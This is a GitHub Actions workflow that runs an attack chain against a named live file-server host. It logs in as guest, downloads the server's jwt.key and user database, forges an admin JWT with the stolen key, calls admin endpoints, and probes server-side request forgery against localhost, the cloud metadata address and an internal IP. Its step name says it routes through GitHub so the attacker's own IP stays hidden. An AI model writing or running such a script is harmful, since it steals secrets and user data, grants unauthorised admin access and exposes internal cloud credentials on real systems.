name: openlist-admin-ssrf
on:
  workflow_dispatch:
jobs:
  admin:
    runs-on: ubuntu-latest
    steps:
      - name: harvest jwt.key + dump users + forge admin JWT + SSRF probe (GitHub relay, zero own-IP)
        run: |
          set +e
          B="https://pan.yazinb.icu"
          TOKEN=$(curl -skS -m20 -X POST "$B/api/auth/login" -H "Content-Type: application/json" -d '{"username":"guest","password":"guest"}' | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('data',{}).get('token',''))")
          echo "guest_token_len=${#TOKEN}"
          SUB=$(curl -skS -m30 -X POST "$B/api/fs/list" -H "Authorization: $TOKEN" -H "Content-Type: application/json" -d '{"path":"/"}' | python3 -c "import sys,json;print(json.load(sys.stdin)['data']['content'][0]['name'])")
          echo "SUB=[$SUB]"
          get_raw () { curl -skS -m30 -X POST "$B/api/fs/get" -H "Authorization: $TOKEN" -H "Content-Type: application/json" -d "{\"path\":\"$1\"}" | python3 -c "import sys,json;print(json.load(sys.stdin).get('data',{}).get('raw_url',''))"; }
          dl () { curl -skS -m120 "$1" -o "$2" -w "  dl $2 -> HTTP %{http_code} bytes=%{size_download}\n"; }
          U=$(get_raw "/$SUB/jwt.key"); dl "$U" /tmp/jwt.key
          echo "jwt.key ascii=[$(cat /tmp/jwt.key)]  sha256=$(sha256sum /tmp/jwt.key|cut -c1-32)"
          U=$(get_raw "/$SUB/data/artex.sqlite"); dl "$U" /tmp/artex.sqlite
          echo "artex.sqlite size=$(wc -c < /tmp/artex.sqlite)"
          CHOSEN=$(python3 -c "import sqlite3;c=sqlite3.connect('/tmp/artex.sqlite');tabs=[r[0] for r in c.execute(\"select name from sqlite_master where type='table'\")];ut=[t for t in tabs if 'user' in t.lower()][0];cols=[d[1] for d in c.execute('PRAGMA table_info(%s)'%ut)];rows=list(c.execute('select * from %s'%ut));pcol=next((i for i,c in enumerate(cols) if c.lower() in ('permission','is_admin','role')),None);ucol=next((i for i,c in enumerate(cols) if c.lower() in ('username','user','name')),0);ch=next((r[ucol] for r in rows if pcol is not None and str(r[pcol]) in ('1','admin','true','True','root')),None);print(ch if ch else (rows[0][ucol] if rows else ''))")
          echo "ADMINUSER=[$CHOSEN]"
          ADMINUSER="${CHOSEN:-admin}"
          ADMINJWT=$(python3 -c "import hmac,hashlib,base64,json,time,sys;key=open('/tmp/jwt.key','rb').read().strip();b=lambda x:base64.urlsafe_b64encode(x).rstrip(b'=');usr=sys.argv[1] if len(sys.argv)>1 and sys.argv[1] else 'admin';now=int(time.time());h=b(json.dumps({'alg':'HS256','typ':'JWT'}).encode());p=b(json.dumps({'exp':now+3600,'iat':now,'nbf':now,'username':usr,'pwd_ts':0}).encode());s=b(hmac.new(key,(h+b'.'+p).encode(),hashlib.sha256).digest());print(h.decode()+'.'+p.decode()+'.'+s.decode())" "$ADMINUSER")
          echo "ADMINJWT_LEN=${#ADMINJWT}"
          echo "--- /api/me ---"
          curl -skS -m20 -X GET "$B/api/me" -H "Authorization: $ADMINJWT" -w "\n  HTTP %{http_code}\n" | head -c 600
          echo "--- /api/admin/setting/list ---"
          curl -skS -m20 -X POST "$B/api/admin/setting/list" -H "Authorization: $ADMINJWT" -H "Content-Type: application/json" -d '{}' -w "\n  HTTP %{http_code}\n" | head -c 400
          echo "--- SSRF: add_offline_download 127.0.0.1:80 ---"
          curl -skS -m30 -X POST "$B/api/fs/add_offline_download" -H "Authorization: $ADMINJWT" -H "Content-Type: application/json" -d '{"path":"/ssrf1","urls":["http://127.0.0.1:80/"]}' -w "\n  HTTP %{http_code}\n" | head -c 400
          echo "--- SSRF: 169.254.169.254 ---"
          curl -skS -m30 -X POST "$B/api/fs/add_offline_download" -H "Authorization: $ADMINJWT" -H "Content-Type: application/json" -d '{"path":"/ssrf2","urls":["http://169.254.169.254/latest/meta-data/"]}' -w "\n  HTTP %{http_code}\n" | head -c 400
          echo "--- SSRF: self 119.28.135.153:443 ---"
          curl -skS -m30 -X POST "$B/api/fs/add_offline_download" -H "Authorization: $ADMINJWT" -H "Content-Type: application/json" -d '{"path":"/ssrf3","urls":["http://119.28.135.153:443/"]}' -w "\n  HTTP %{http_code}\n" | head -c 400
          echo "=== DONE ==="
